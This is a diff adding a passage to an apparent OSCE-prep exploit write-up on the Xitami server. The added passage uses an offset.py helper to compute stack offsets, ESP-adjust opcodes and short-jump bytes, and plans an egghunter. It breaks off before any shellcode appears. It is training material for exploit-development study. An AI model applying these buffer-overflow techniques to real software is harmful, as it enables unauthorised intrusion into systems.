@@ -323,6 +323,28 @@ It looks like our `A` buffer begins at `0006FE48`; however, around `0006FE94` an
 
 ![](/assets/images/CTP/xitamistart.JPG)
 
+We currently sit at `0006FF78` so let's feed these values to `offset.py`. 
+```terminal_session
+root@kali:~/OSCE/ # offset                                         
+Enter Address #1: 6ff78
+Enter Address #2: 6fea4
+[+] Hex offset: 0xd4
+[+] Decimal offset: 212
+[-] ESP Sub Adjust Opcodes: \x54\x58\x2c\x6a\x2c\x6a\x50\x5c
+[+] ESP Add Adjust Opcodes: \x54\x58\x04\x6a\x04\x6a\x50\x5c
+```
+
+The script tells us our offset is 212 and since this is beyond a short jump, we do not get any `JMP` opcodes back. 212 bytes is definitely not going to be enough for shellcode. We will have to use an egghunter. An egghunter is typically 32 bytes. Let's jump backwards 50 bytes to make sure we have enough space for the egghunter and some cushion to spare. Once again, we can use `offset.py`. 
+
+This time, we use the `-j, --jump` flag to tell `offset.py` that we want to get opcodes for a short jump. We then tell it the offset in decimal that we want to achieve. 
+```terminal_session
+root@kali:~/OSCE/ # offset -j                                           
+Enter offset in decimal: 50
+[-] Negative jump opcodes: \xeb\xcc
+[+] Positive jump opcodes: \xeb\x32
+```
+
+
 --TO BE CONTINUED--
 
 
